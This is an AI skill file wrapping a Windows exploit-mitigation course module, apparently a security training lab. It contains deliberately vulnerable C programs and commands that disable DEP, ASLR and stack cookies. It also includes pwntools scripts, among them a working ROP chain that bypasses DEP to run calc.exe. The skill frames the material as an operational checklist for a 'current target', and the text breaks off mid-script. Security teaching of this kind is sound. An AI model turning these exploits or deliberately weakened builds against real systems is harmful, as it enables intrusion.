---
name: offensive-windows-mitigations
description: 'Deep-dive on Windows exploit mitigations: ASLR, DEP/NX, CFG, CET/Shadow
  Stack, SEHOP, Heap Guard, ACG, Arbitrary Code Guard. Covers both the protection
  mechanism and known bypass techniques. Use when researching Windows exploit mitigations,
  planning bypass strategies, or understanding protection depth.'
---

# SKILL: Week 6: Understanding Windows Mitigations

## Metadata
- **Skill Name**: windows-mitigations
- **Folder**: offensive-windows-mitigations
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/6-windows-mitigations.md

## Description
Deep-dive on Windows exploit mitigations: ASLR, DEP/NX, CFG, CET/Shadow Stack, SEHOP, Heap Guard, ACG, Arbitrary Code Guard. Covers both the protection mechanism and known bypass techniques. Use when researching Windows exploit mitigations, planning bypass strategies, or understanding protection depth.

## Trigger Phrases
Use this skill when the conversation involves any of:
`Windows mitigations, ASLR, DEP, NX, CFG, CET, shadow stack, SEHOP, heap guard, ACG, mitigation bypass, exploit mitigation, Windows hardening`

## Instructions for Claude

When this skill is active:
1. Load and apply the full methodology below as your operational checklist
2. Follow steps in order unless the user specifies otherwise
3. For each technique, consider applicability to the current target/context
4. Track which checklist items have been completed
5. Suggest next steps based on findings

---

## Full Methodology

# Week 6: Understanding Windows Mitigations

## Overview

_created by AnotherOne from @Pwn3rzs Telegram channel_.

Last week you learned basic exploitation in an environment without protections.
This week, you'll learn about the defensive mechanisms that modern Windows systems employ to prevent those attacks.
Understanding these mitigations is essential before learning to bypass them (Week 8). Week 7 continues with enterprise security topics (offensive reconnaissance, Windows 11 24H2/25H2 mitigations, cross-platform defenses).

**This Week's Focus**:

- Understand how each mitigation works
- Learn to detect active mitigations
- Verify mitigation effectiveness
- Test exploits against protected binaries
- Prepare for Week 7's boundaries and Week 8's bypass techniques

### Prerequisites

Before starting this week, ensure you have:

- Completed Week 5: Basic Exploitation (Linux) - you should be able to exploit stack overflows, build ROP chains, and use pwntools
- A Windows 11 VM (isolated, snapshot before each exercise)
- Visual Studio 2022 Build Tools installed
- WinDbg Preview installed
- Basic familiarity with x64 assembly and calling conventions

### Week 6 Deliverables

By the end of this week, you should have completed the following:

- [ ] **Lab Environment**: Windows 11 VM with Visual Studio Build Tools, WinDbg Preview, and Sysinternals installed
- [ ] **Test Binaries**: Compiled `vulnerable_suite_win_mitigated.c` and `vuln_server_win.c` with various mitigation flags
- [ ] **DEP Verified**: Demonstrated DEP blocking shellcode execution with crash analysis (Exception Code 0xC0000005, Param 8)
- [ ] **ASLR Measured**: Recorded addresses of `check_aslr.exe` across 3 reboots and documented randomization behavior
- [ ] **Stack Cookie Tested**: Triggered `/GS` cookie check failure and analyzed in WinDbg
- [ ] **CFG Validated**: Demonstrated CFG blocking indirect call to invalid target
- [ ] **Crash Dumps Analyzed**: Created at least 3 crash dumps and identified which mitigation caused each termination using `!analyze -v`
- [ ] **Week 5 Exploit Retesting**: Re-ran Week 5 exploits against mitigated binaries and documented failures
- [ ] **Mitigation Audit Report**: Generated system-wide and per-binary mitigation audit using PowerShell scripts
- [ ] **Hardening Capstone**: Completed the SecureServer v1.0 hardening exercise (Day 7)

### Context

Why Mitigations Matter: Modern exploits chain multiple vulnerabilities and bypass layers of protection. Understanding mitigations helps you:

- Recognize when an exploit is blocked vs. when it succeeds
- Analyze crash dumps to identify exploitation attempts
- Design defense-in-depth strategies
- Prepare for Weeks 7-8 (advanced mitigations and bypass techniques)

**Recent CVEs Demonstrating Mitigation Importance**:

| CVE            | Vulnerability                   | Mitigations Involved | Outcome                               |
| -------------- | ------------------------------- | -------------------- | ------------------------------------- |
| CVE-2024-21338 | AppLocker (appid.sys) EoP       | KASLR, SMEP, kCFG    | Admin-to-Kernel bypass of kCFG        |
| CVE-2024-30088 | Authz Kernel TOCTOU             | KASLR, SMEP, CFG     | Exploited via race condition          |
| CVE-2023-36802 | MSKSSRV Object Type Confusion   | KASLR, SMEP, CFG     | Pool spray + type confusion to EoP    |
| CVE-2025-29824 | CLFS Driver Use-After-Free      | KASLR, SMEP          | Zero-day exploited in wild (Apr 2025) |
| CVE-2024-49138 | CLFS Heap-Based Buffer Overflow | DEP, ASLR, KASLR     | EoP exploited in wild (Dec 2024)      |
| CVE-2023-32019 | Windows Kernel Info Disclosure  | KASLR                | Leaked kernel memory bypassing KASLR  |
| CVE-2023-28252 | CLFS Driver EoP                 | KASLR, SMEP          | Abused CLFS log file parsing          |
| CVE-2022-34718 | Windows TCP/IP RCE (EvilESP)    | DEP, ASLR, CFG       | Required sophisticated heap grooming  |

**Connection to Week 4 (Crash Analysis)**:

When you receive a crash dump, the exception codes reveal which mitigation stopped the exploit:

```text
Week 4 Crash Analysis -> Week 6 Mitigation Identification
─────────────────────────────────────────────────────────
Process Exit Code         WinDbg Exception Code        Mitigation
──────────────────────    ─────────────────────        ──────────
0xC0000005 (Param[0]=8)   0xC0000005                   DEP violation (execute on NX page)
0xC0000409                0xC0000409 (subcode 2)        /GS stack cookie corruption
0x80000003                0xC0000409 (subcode 10)       CFG indirect call validation failed
0x80000003                0xC0000407                    CET shadow stack mismatch
0xC0000374                0xC0000374                    Heap integrity check failed

IMPORTANT: Python/cmd see the PROCESS EXIT CODE. WinDbg sees the EXCEPTION CODE.
CFG and CET both use __fastfail() which raises int 0x29 -> exit code 0x80000003,
but the EXCEPTION RECORD inside WinDbg shows the original status code.
```

### Windows Mitigations Relevance

Understanding these bug classes prepares you for real-world vulnerability research:

| Bug Class        | Example CVE                | Mitigation Interaction                            | Week 8 Bypass        |
| ---------------- | -------------------------- | ------------------------------------------------- | -------------------- |
| Race Condition   | CVE-2024-30088 (Authz)     | TOCTOU bypasses simple checks                     | Timing manipulation  |
| Type Confusion   | CVE-2023-36802 (MSKSSRV)   | CFG validates calls, but confused object bypasses | Object spray         |
| Pointer Deref    | CVE-2024-21338 (appid.sys) | kCFG bypass via direct manipulation               | Arbitrary read/write |
| Integer Overflow | CVE-2021-34535 (RDP)       | Safe integer functions                            | Find unchecked paths |
| Arbitrary Write  | CVE-2023-28252 (CLFS)      | KASLR, SMEP                                       | Info leak chain      |

## Day 1: DEP and ASLR Fundamentals

- **Goal**: Understand the two foundational exploit mitigations: DEP and ASLR.
- **Activities**:
  - _Reading_:
    - [Microsoft DEP Documentation](https://learn.microsoft.com/en-us/windows/win32/memory/data-execution-prevention)
    - [Bypassing ASLR/DEP ](https://www.exploit-db.com/docs/english/17914-bypassing-aslrdep.pdf)
    - [ASLR Implementation Details](https://blackhat.com/presentations/bh-dc-07/Whitehouse/Paper/bh-dc-07-Whitehouse-WP.pdf)
  - _Online Resources_:
    - [OffensiveCon23 - Changing and Unchanged Things in Vulnerability Research](https://www.youtube.com/watch?v=hz9HiM2eKFY)
    - [Bypass Control Flow Guard Comprehensively](https://www.youtube.com/watch?v=K929gLPwlUs)
    - [BlueHat 2018 - Windows: Hardening with Hardware](https://www.youtube.com/watch?v=8V0wcqS22vc)
    - [OffensiveCon18 - The Evolution of CFI Attacks and Defenses](https://www.youtube.com/watch?v=oOqpl-2rMTw)
    - [Battle Of The SKM And IUM: How Windows 10 Rewrites OS Architecture](https://www.youtube.com/watch?v=LqaWIn4y26E)
  - _Tool Setup_:
    - Windows 11 VM (24H2 recommended)
    - Process Explorer / Process Monitor
    - dumpbin (Visual Studio tool)
    - WinDbg Preview with Time Travel Debugging
  - _Exercise_:
    - Verify DEP blocks shellcode execution
    - Observe ASLR randomization across reboots
    - Compile programs with/without protections
    - Analyze a real CVE crash dump to identify mitigation involvement

### Deliverables

- **Lab Report**: Documented observations of DEP crashes (Exception Code 0xC0000005, Param 8)
- **ASLR Log**: Recorded addresses of `check_aslr.exe` across 3 reboots
- **Crash Analysis**: Completed mitigation identification table for the 4 test dumps
- **Analysis Report**: Completed analysis table for all 4 crash dumps
- **Screenshots**: WinDbg output showing the "Smoking Gun" for each crash
- **Write-up**: 1-paragraph explanation of how you identified each mitigation

### Lab Directory Structure

```bash
C:\Windows_Mitigations_Lab\
- src\                          # Source code for test binaries
- bin\                          # Compiled binaries
- dumps\                        # Crash dumps from WER/ProcDump
- exploits\                     # Week 5 exploits for testing
- reports\                      # Mitigation audit reports
```

### Transitioning from Linux to Windows Debugging

If you are coming from Week 5 (Linux), use this table to map your `pwndbg` commands to WinDbg:

| Description        | Pwndbg Equivalent        | WinDbg Command |
| ------------------ | ------------------------ | -------------- |
| **Crash analysis** | `bt`, `regs`, `context`  | `!analyze -v`  |
| **Memory display** | `x/b`, `x/w`, `x/g`      | `db/dd/dq`     |
| **Smart pointers** | `telescope`              | `dps`          |
| **Disassembly**    | `x/i` or `disassemble`   | `u`            |
| **Set breakpoint** | `break` or `b`           | `bp`           |
| **Hardware watch** | `watch` or `rwatch`      | `ba w`         |
| **Continue**       | `continue` or `c`        | `g`            |
| **Step over/into** | `next` / `step`          | `p` / `t`      |
| **Search memory**  | `search "string"`        | `s -a`         |
| **List modules**   | `vmmap` or `info shared` | `lm`           |
| **Heap analysis**  | `heap`, `bins`, `arena`  | `!heap`        |

> [!TIP]
> **Week 4 Callback**: For more advanced WinDbg usage, refer back to **Week 4: Crash Analysis** where we covered TTD (Time Travel Debugging) and symbol configuration in detail.

### Standardized Vulnerable Targets

To maintain continuity with previous weeks, we will use a Windows port of the vulnerable suite and the capstone server. Save these into `C:\Windows_Mitigations_Lab\src`.

**1. The Mitigation Test Suite (`vulnerable_suite_win_mitigated.c`)**

This replaces generic tests (`dep_test.c`, etc.) with a unified suite mirroring Week 4's lab.

> [!IMPORTANT]
> **Modern MSVC removed `gets()`** - it was removed in C11 as too dangerous.
> We use `fgets()` with a size mismatch instead, which MSVC recognizes as needing `/GS` protection.

```c
/*
 * vulnerable_suite_win_mitigated.c
 * Windows Port of Week 4 Vulnerable Suite
 * Compile with varying flags to test mitigations.
 *
 * NOTE: gets() was removed in modern MSVC. We use fgets() with
 * intentional size mismatch to create the same vulnerability
 * while triggering MSVC's /GS heuristics.
 */
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "user32.lib")

void stack_overflow() {
    char buffer[64];

    printf("[*] Stack Overflow Target: Buffer at %p\n", buffer);
    printf("[*] Enter payload: ");
    fflush(stdout);

    // Vulnerable: fgets reads up to 256 bytes into 64-byte buffer!
    // This pattern triggers MSVC's /GS protection when compiled with /GS
    fgets(buffer, 256, stdin);
    buffer[strcspn(buffer, "\n")] = 0;  // Remove newline

    printf("[*] Received: %s\n", buffer);
}

void heap_overflow() {
    HANDLE hHeap = GetProcessHeap();
    char *chunk1 = (char*)HeapAlloc(hHeap, 0, 64);
    char *chunk2 = (char*)HeapAlloc(hHeap, 0, 64);

    printf("[*] Heap Chunks: %p, %p\n", chunk1, chunk2);
    printf("[*] Simulating linear overflow from Chunk1...\n");

    // Vulnerable: overflow into chunk2 metadata
    memset(chunk1, 'A', 128);

    printf("[*] Freeing corrupted Chunk2 (Should crash if Heap Integrity on)...\n");
    HeapFree(hHeap, 0, chunk2);
    HeapFree(hHeap, 0, chunk1);
}

void dep_trigger() {
    printf("[*] DEP Trigger: Executing data section...\n");
    // Int3 (0xCC) ; Ret (0xC3)
    unsigned char shellcode[] = { 0xCC, 0xC3 };
    void (*func)() = (void(*)())shellcode;
    func();
}

void funcptr_test() {
    void (*callback)() = dep_trigger;

    printf("[*] Function Pointer Test\n");
    printf("[*] Function pointer at: %p\n", &callback);
    printf("[*] Currently points to: %p\n", callback);
    printf("[*] Enter new function address (hex): ");
    fflush(stdout);

    unsigned long long addr;
    scanf("%llx", &addr);
    callback = (void(*)())addr;

    printf("[*] Calling function at %p...\n", callback);
    callback();  // CFG would block this if target is invalid
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <mode>\n", argv[0]);
        printf("Modes: stack, heap, dep, funcptr\n");
        return 1;
    }

    if (strcmp(argv[1], "stack") == 0) stack_overflow();
    else if (strcmp(argv[1], "heap") == 0) heap_overflow();
    else if (strcmp(argv[1], "dep") == 0) dep_trigger();
    else if (strcmp(argv[1], "funcptr") == 0) funcptr_test();

    return 0;
}
```

**2. The Capstone Server (`vuln_server_win.c`)**

A Winsock port of the Week 5 Capstone. Used to test network exploits against hardened Windows.

```c
/*
 * vuln_server_win.c - Winsock Port
 * Compile: cl vuln_server_win.c /link ws2_32.lib
 */
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

void handle_client(SOCKET client_socket) {
    char buffer[512];
    char response[] = "Welcome to SecureServer v1.0 (Windows)\n";
    send(client_socket, response, strlen(response), 0);

    // VULNERABILITY: Stack Buffer Overflow
    // recv accepts up to 1024 bytes into a 512 byte buffer
    int bytes_received = recv(client_socket, buffer, 1024, 0);

    if (bytes_received > 0) {
        printf("[*] Received %d bytes\n", bytes_received);
        buffer[bytes_received] = '\0';
        // Echo back (Format String vuln potential if printf(buffer) used)
        send(client_socket, buffer, bytes_received, 0);
    }
    closesocket(client_socket);
}

int main() {
    WSADATA wsa;
    SOCKET server_fd, client_fd;
    struct sockaddr_in server, client;
    int c;

    WSAStartup(MAKEWORD(2,2), &wsa);
    server_fd = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(8888);

    bind(server_fd, (struct sockaddr *)&server, sizeof(server));
    listen(server_fd, 3);

    printf("[*] Windows Vulnerable Server listening on port 8888...\n");

    c = sizeof(struct sockaddr_in);
    while((client_fd = accept(server_fd, (struct sockaddr *)&client, &c)) != INVALID_SOCKET) {
        printf("[*] Connection accepted\n");
        handle_client(client_fd);
    }

    closesocket(server_fd);
    WSACleanup();
    return 0;
}
```

**Per-Binary Mitigation Control**:

```bash
# RECOMMENDED: Control mitigations via compiler/linker flags per binary
# This is safer, doesn't require reboots, and mirrors enterprise practice

# Build WITHOUT mitigations (for Week 5-style testing):
cl /GS- /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\dep_test.exe /link /NXCOMPAT:NO /DYNAMICBASE:NO /FIXED

# Build WITH mitigations (for Week 6 testing):
cl /GS /guard:cf /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\mitigated_test.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA /guard:cf

# Per-process mitigation control (Run in ADMIN POWERSHELL):
Set-ProcessMitigation -Name "bin\dep_test.exe" -Disable DEP,ForceRelocateImages,BottomUp
Set-ProcessMitigation -Name "bin\dep_test.exe" -Enable DEP,ForceRelocateImages,BottomUp

# NOTE: On x64 Windows, DEP is often MANDATORY for 64-bit processes
# regardless of linker flags. Use Set-ProcessMitigation to override.
```

**Compiler/Linker Flag Reference** (x64):

| Mitigation    | Enable Flag              | Disable Flag             |
| ------------- | ------------------------ | ------------------------ |
| DEP           | `/NXCOMPAT` (default)    | `/NXCOMPAT:NO`           |
| ASLR          | `/DYNAMICBASE` (default) | `/DYNAMICBASE:NO /FIXED` |
| High Entropy  | `/HIGHENTROPYVA`         | (omit flag)              |
| Stack Cookies | `/GS` (default)          | `/GS-`                   |
| CFG           | `/guard:cf`              | (omit flag)              |
| CET Compat    | `/CETCOMPAT`             | (omit flag)              |

### Graduated Mitigation Introduction

#### Step 1: DEP Only

**Setup** (Using Standardized Suite):

```bash
# PREFERRED: Use per-binary linker flags instead of system-wide changes

# Compile WITH DEP, WITHOUT ASLR (to isolate DEP testing)
cl /GS- /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\dep_test.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED

# Verify the binary has DEP enabled:
dumpbin /headers bin\dep_test.exe | findstr "NX compatible"
# Should show: "NX compatible"
```

#### Step 2: DEP + ASLR

**Setup**:

```bash
# Compile with BOTH DEP and ASLR enabled via linker flags
cl /GS- /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\aslr_test.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA

# Verify:
dumpbin /headers bin\aslr_test.exe | findstr "NX Dynamic High"
# Should show: NX compatible, Dynamic base, High Entropy Virtual Addresses
```

> [!CAUTION]
> **System DLL ASLR**
> Even if you compile your binary with `/DYNAMICBASE:NO /FIXED`, Windows 10/11 will still randomize the location of **system DLLs** like `kernel32.dll` and `kernelbase.dll` on each boot.
>
> To demonstrate the ASLR bypass working on `dep_test.exe`, you must:
>
> 1. Find the **current** addresses using WinDbg (see instructions below)
> 2. Update the address variables in your script
> 3. The exploit will work on `dep_test.exe` (binary has no ASLR)
> 4. The exploit will **fail** on `aslr_test.exe` (binary base is randomized)
> 5. After a **reboot**, even `dep_test.exe` addresses become invalid - demonstrating why ASLR matters

**Finding Gadget Addresses with WinDbg**:

```bash
# Launch WinDbg with the target
windbg C:\Windows_Mitigations_Lab\bin\dep_test.exe stack

# In WinDbg, run these commands:
0:000> g                                              # Run to the input prompt
0:000> lm                                             # List loaded modules
0:000> x KERNEL32!WinExec                             # Find WinExec address
0:000> s -b KERNELBASE <start> L<size> 59 c3          # Find 'pop rcx; ret' (59 c3)
0:000> u <address> L2                                 # Verify the gadget

# Example session:
# 0:000> x KERNEL32!WinExec
# 00007ffd`616907f0 KERNEL32!WinExec
# 0:000> s -b KERNELBASE 00007ffd`5f8d0000 L3ef000 59 c3
# 00007ffd`5f912303  59 c3 ...
# 0:000> u 00007ffd`5f912303 L2
# 00007ffd`5f912303 59       pop rcx
# 00007ffd`5f912304 c3       ret      <- Clean gadget!
```

**Test Your Week 5 ROP Exploit** (x64):

This script demonstrates a ROP chain that bypasses DEP using `WinExec`. Run it against both binaries to see ASLR's effect:

```python
#!/usr/bin/env python3
# c:\Windows_Mitigations_Lab\exploits\week5_aslr_test.py
"""
Test: Week 5 ROP/ret2lib exploit - Demonstrating ASLR's Effect

Usage:
  1. First, get current addresses from WinDbg attached to dep_test.exe:
     - x KERNEL32!WinExec
     - s -b KERNELBASE <start> L<size> 59 c3  (find 'pop rcx; ret')
  2. Update the addresses below
  3. Run against dep_test.exe  -> Should SUCCEED (calc pops)
  4. Run against aslr_test.exe -> Should FAIL (addresses randomized)
  5. Reboot and try dep_test.exe again -> Should FAIL (DLL addresses changed)
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

# Choose target binary (default: dep_test.exe for success demo)
target = sys.argv[1] if len(sys.argv) > 1 else 'dep_test.exe'
target_path = rf'C:\Windows_Mitigations_Lab\bin\{target}'

log.info(f"Target: {target}")
io = process([target_path, 'stack'])

# --- VERIFIED ADDRESSES FROM WINDBG SESSION ---
# UPDATE THESE for your system! Find them with:
#   WinDbg> x KERNEL32!WinExec
#   WinDbg> s -b KERNELBASE <start> L<size> 59 c3
#   ropper --file bin\dep_test.exe --search "ret"
winexec_addr   = 0x00007ffd616907f0  # KERNEL32!WinExec
pop_rcx_ret    = 0x00007ffd5f912303  # KERNELBASE: pop rcx; ret
ret_gadget     = 0x0000000140001078  # dep_test.exe: clean 'ret' gadget

# NOTE: ret_gadget is from the BINARY, not system DLLs!
# For dep_test.exe (no ASLR): binary always loads at 0x140000000
# For aslr_test.exe (ASLR): binary base is randomized - this gadget WON'T WORK

log.info(f"WinExec:     {hex(winexec_addr)}")
log.info(f"pop rcx;ret: {hex(pop_rcx_ret)}")

# --- LEAK STACK ADDRESS ---
io.recvuntil(b"Buffer at ")
stack_leak = int(io.recvline().strip(), 16)
log.info(f"Stack leak:  {hex(stack_leak)}")

io.recvuntil(b"Enter payload: ")

# --- BUILD PAYLOAD ---
offset_to_ret = 72
cmd_string_offset = 200  # Place "calc.exe" at a safe offset
cmd_string_addr = stack_leak + cmd_string_offset

payload = b"A" * offset_to_ret

# ROP Chain:
# 1. Align stack (needed for some functions)
payload += p64(ret_gadget)
# 2. pop rcx; ret -> RCX = &"calc.exe"
payload += p64(pop_rcx_ret)
payload += p64(cmd_string_addr)
# 3. Call WinExec("calc.exe", <whatever is in RDX>)
payload += p64(winexec_addr)

# Pad to cmd_string_offset and add the command
payload = payload.ljust(cmd_string_offset, b"X")
payload += b"calc.exe\x00"

log.info(f"Payload size: {len(payload)}")
log.info(f"cmd @ stack+{cmd_string_offset} = {hex(cmd_string_addr)}")

io.sendline(payload)

# --- CHECK RESULT ---
import time
time.sleep(2)

# Wait for process and check result
try:
    io.wait(timeout=3)
except:
    pass

if io.returncode is None:
    # Process still running - ROP chain might have worked!
    log.success("Process still alive after ROP chain")
    log.info("CHECK MANUALLY: Did calc.exe pop up?")
    log.info(f"  - If YES: Exploit succeeded against {target}")
    log.info(f"  - If NO:  ROP chain failed silently (bad addresses?)")
    io.close()
else:
    exit_code = io.returncode & 0xFFFFFFFF
    if exit_code == 0xc0000005:  # ACCESS_VIOLATION
        log.failure(f"Access Violation - exploit FAILED against {target}")
        if 'aslr' in target.lower():
            log.info("EXPECTED: ASLR randomized the binary base, ret_gadget is invalid!")
            log.info("The ROP chain used a gadget from the binary at a fixed address.")
        else:
            log.warning("Addresses may be stale. Re-run WinDbg and update them.")
    elif exit_code == 0xc0000409:  # STACK_BUFFER_OVERRUN
        log.failure(f"/GS cookie triggered - exploit FAILED against {target}")
    elif exit_code == 0:
        log.info("Process exited normally (code 0)")
        log.info("CHECK MANUALLY: Did calc.exe pop up?")
    else:
        log.info(f"Exit code: {hex(exit_code)}")
```

**Expected Results**:

```bash
# Against dep_test.exe (no ASLR) - calc.exe pops!
python exploits\week5_aslr_test.py dep_test.exe
#[*] Target: dep_test.exe
#[*] WinExec:     0x7ffd616907f0
#[*] pop rcx;ret: 0x7ffd5f912303
#[*] Stack leak:  0x14fea0          <- Low, predictable address (no ASLR)
#[+] Process still alive after ROP chain
#[*] CHECK MANUALLY: Did calc.exe pop up?
#    -> YES! calc.exe appeared - exploit succeeded!

# Against aslr_test.exe (ASLR enabled) - exploit fails!
python exploits\week5_aslr_test.py aslr_test.exe
#[*] Target: aslr_test.exe
#[*] Stack leak:  0xaf185efab0      <- High entropy, randomized!
#[*] Process exited with code: 0xc0000005
#[-] Access Violation - exploit FAILED against aslr_test.exe
#[*] EXPECTED: ASLR randomized the binary base, ret_gadget is invalid!
```

| Target          | Stack Address      | ret_gadget Valid? | Calc Pops? | Why                                               |
| --------------- | ------------------ | ----------------- | ---------- | ------------------------------------------------- |
| `dep_test.exe`  | `0x14fea0` (fixed) | Yes               | Yes        | Binary at `0x140000000`, gadget at known address  |
| `aslr_test.exe` | Random each run    | No                | No         | Binary base randomized, `0x140001078` is unmapped |

> [!IMPORTANT]
> **Why ASLR Breaks the Exploit**
> The ROP chain uses `ret_gadget = 0x140001078` which is an address **inside the binary**.
>
> - `dep_test.exe`: Always loads at `0x140000000` (ASLR disabled), gadget is valid
> - `aslr_test.exe`: Loads at random base each run, `0x140001078` points to garbage -> crash

#### Step 3: DEP + ASLR + Stack Cookies

**Setup**:

```bash
# Compile WITH /GS (stack cookies) - this is the VS default
# The /D_CRT_SECURE_NO_WARNINGS suppresses scanf deprecation warnings
cl /GS /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\gs_test.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA

# Check protections - /GS doesn't show in headers, but DEP+ASLR will:
dumpbin /headers bin\gs_test.exe | findstr "NX Dynamic High"
# Expected: NX compatible, Dynamic base, High Entropy Virtual Addresses

# Also compile WITHOUT /GS for comparison:
cl /GS- /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\no_gs_test.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA
```

> [!NOTE]
> **Stack Cookies (/GS) Don't Appear in PE Headers**
> Unlike DEP and ASLR, stack cookie protection is purely a compiler feature.
> The cookie check code is embedded directly in function prologues/epilogues.
> You can verify /GS is active by disassembling a function with a local buffer:
>
> ```
> dumpbin /disasm bin\gs_test.exe | findstr "__security_cookie"
> ```

**Forcing /GS Protection**:

MSVC uses heuristics to decide which functions need stack cookies. Functions with `strcpy`, `fgets` with size mismatch, or similar patterns are protected. Simple `getchar()` loops may be skipped!

```bash
# The vulnerable function MUST use patterns MSVC recognizes as dangerous:
# - strcpy() to a local buffer
# - fgets() with size > buffer size
# - sprintf() without bounds

# Our vulnerable_suite uses: fgets(buffer, 256, stdin) into char buffer[64]
# This triggers /GS because 256 > 64

# Verify cookie is present by checking for the cookie load pattern:
dumpbin /disasm bin\gs_test.exe > disasm.txt
powershell -Command "Get-Content disasm.txt | Select-Object -First 50"
# Look for: mov rax,qword ptr [ADDR] ; xor rax,rsp ; mov [rsp+XX],rax
```

**Test Your Week 5 Stack Overflow**:

```python
#!/usr/bin/env python3
# c:\Windows_Mitigations_Lab\exploits\week5_gs_test.py
"""
Test: Week 5 stack overflow against DEP+ASLR+GS system
Expected: FAIL - stack cookie corrupted, process terminates before return

Usage:
  python exploits\week5_gs_test.py gs_test.exe     # With /GS - should fail with cookie check
  python exploits\week5_gs_test.py no_gs_test.exe  # Without /GS - crashes at return
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

# Choose target binary
target = sys.argv[1] if len(sys.argv) > 1 else 'gs_test.exe'
target_path = rf'C:\Windows_Mitigations_Lab\bin\{target}'

log.info(f"Target: {target}")
io = process([target_path, 'stack'])

# Wait for the prompt
io.recvuntil(b"Buffer at ")
stack_leak = int(io.recvline().strip(), 16)
log.info(f"Stack leak: {hex(stack_leak)}")

io.recvuntil(b"Enter payload: ")

# Stack layout (from disassembly of gs_test.exe):
#   sub rsp, 88h         ; 136 byte frame
#   buffer at [rsp+30h]  ; offset 48
#   cookie at [rsp+70h]  ; offset 112 (64 bytes after buffer start)
#   return at [rsp+88h]  ; offset 136 (after frame restoration)
#
# To trigger /GS: overflow past 64 bytes to corrupt the cookie at offset 64
# To trigger crash without /GS: overflow ~88 bytes to corrupt return address
#
# We send 150 bytes to ensure we corrupt both cookie AND return address

overflow_size = 150  # Enough to corrupt cookie (64+) and return address (88+)
payload = b"A" * overflow_size

log.info(f"Sending {len(payload)} bytes to overflow 64-byte buffer")
io.sendline(payload)

# Wait for process to terminate (use wait() not poll() for Windows compatibility)
try:
    io.wait(timeout=5)
except:
    pass

# Check the return code
if io.returncode is not None:
    exit_code = io.returncode & 0xFFFFFFFF
    log.info(f"Process exited with code: {hex(exit_code)}")

    if exit_code == 0xc0000409:  # STATUS_STACK_BUFFER_OVERRUN
        log.success("Stack buffer overrun detected! (/GS protection triggered)")
        log.info("Cookie was corrupted -> __security_check_cookie() called __fastfail()")
    elif exit_code == 0xc0000005:  # STATUS_ACCESS_VIOLATION
        log.warning("Access Violation - jumped to corrupted return address")
        log.info("No /GS cookie check occurred - function returned to garbage")
    elif exit_code == 0 or exit_code == 1:
        log.warning(f"Process exited normally (code {exit_code}) - no crash!")
    else:
        log.info(f"Check Windows NTSTATUS codes for {hex(exit_code)}")
else:
    log.warning("Process did not terminate within timeout")
    io.close()
```

**Expected Results**:

```bash
# Against gs_test.exe (with /GS) - cookie corruption detected!
python exploits\week5_gs_test.py gs_test.exe
#[*] Target: gs_test.exe
#[*] Stack leak: 0x30242ff940
#[*] Sending 150 bytes to overflow 64-byte buffer
#[*] Process exited with code: 0xc0000409
#[+] Stack buffer overrun detected! (/GS protection triggered)
#[*] Cookie was corrupted -> __security_check_cookie() called __fastfail()

# Against no_gs_test.exe (without /GS) - crashes at return
python exploits\week5_gs_test.py no_gs_test.exe
#[*] Target: no_gs_test.exe
#[*] Stack leak: 0x673ccffc80
#[*] Sending 150 bytes to overflow 64-byte buffer
#[*] Process exited with code: 0xc0000005
#[!] Access Violation - jumped to corrupted return address
#[*] No /GS cookie check occurred - function returned to garbage
```

| Target           | Exit Code    | Meaning                                                            |
| ---------------- | ------------ | ------------------------------------------------------------------ |
| `gs_test.exe`    | `0xc0000409` | STATUS_STACK_BUFFER_OVERRUN - /GS caught the corruption            |
| `no_gs_test.exe` | `0xc0000005` | STATUS_ACCESS_VIOLATION - crashed trying to return to `0xdeadbeef` |

**Document**: "Stack cookies detect overflow before return. Even if I bypass DEP+ASLR, the cookie check terminates the process before the corrupted return address is used."

#### Step 4: Add CFG (Day 3 Preparation)

CFG (Control Flow Guard) validates indirect call targets at runtime. We'll use the standardized suite which includes a function pointer test case.

**Setup**:

```bash
# Compile WITH CFG - all mitigations enabled
cl /GS /guard:cf /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\cfg_test.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA /guard:cf

# Compile WITHOUT CFG for comparison (but keep /GS to isolate CFG testing)
cl /GS /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\no_cfg_test.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA

# Verify CFG is enabled in the binary:
dumpbin /headers /loadconfig bin\cfg_test.exe | findstr "Guard"
# Expected: "Guard CF instrumented" and "Guard" flags in load config
```

> [!NOTE]
> **CFG Compilation Requirement**: CFG protection only applies to binaries compiled with `/guard:cf`.
> Enabling system-wide CFG (`Set-ProcessMitigation -System -Enable CFG`) does NOT protect non-CFG-compiled binaries.
> The call sites must be instrumented by the compiler to perform bitmap validation checks.

**Test Function Pointer Overwrite**:

```python
#!/usr/bin/env python3
# c:\Windows_Mitigations_Lab\exploits\week5_cfg_test.py
"""
Test: Week 5 function pointer overwrite against CFG
Expected: FAIL - CFG validates indirect call target and rejects bad address

Usage:
  python exploits\week5_cfg_test.py cfg_test.exe     # With CFG - should fail CFG check
  python exploits\week5_cfg_test.py no_cfg_test.exe  # Without CFG - crashes at call
"""
from pwn import *
import sys

context.arch = 'amd64'
